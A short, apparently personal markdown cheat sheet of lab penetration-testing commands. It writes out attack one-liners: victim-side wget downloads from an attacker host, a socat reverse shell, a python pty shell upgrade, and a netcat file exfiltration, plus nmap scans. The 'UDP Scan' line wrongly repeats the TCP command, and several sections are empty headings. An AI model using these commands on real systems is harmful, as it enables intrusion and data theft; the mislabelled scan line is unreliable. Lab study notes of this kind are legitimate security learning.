# Useful Commands

> This section will include commands / code I used in the lab environment that I found useful

## Web server

### With Python

Kali: ```python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 80```

Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```

## Upgrade reverse shell

### With Socat

Victim: ```wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat```
        ```chmod +x socat```
        ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444```
        
Kali:   ```socat file:`tty`,raw,echo=0 tcp-listen:4444```

### With Python

Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```

## Send files

### With netcat

Kali:   ```nc -lvp 4444 > file.txt```

Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444 ````

## 
# Enumeration

> Enumeration is the most important thing you can do, at that inevitable stage where you find yourself hitting a wall, 90% of the time it will be because you haven’t done enough enumeration

## Nmap

TCP Scan:

```nmap -sV -sC -p- 10.10.10.216```

UDP Scan:

```nmap -sV -sC -p- 10.10.10.216```

# Privilege Escalation

# Some Scripts

# References
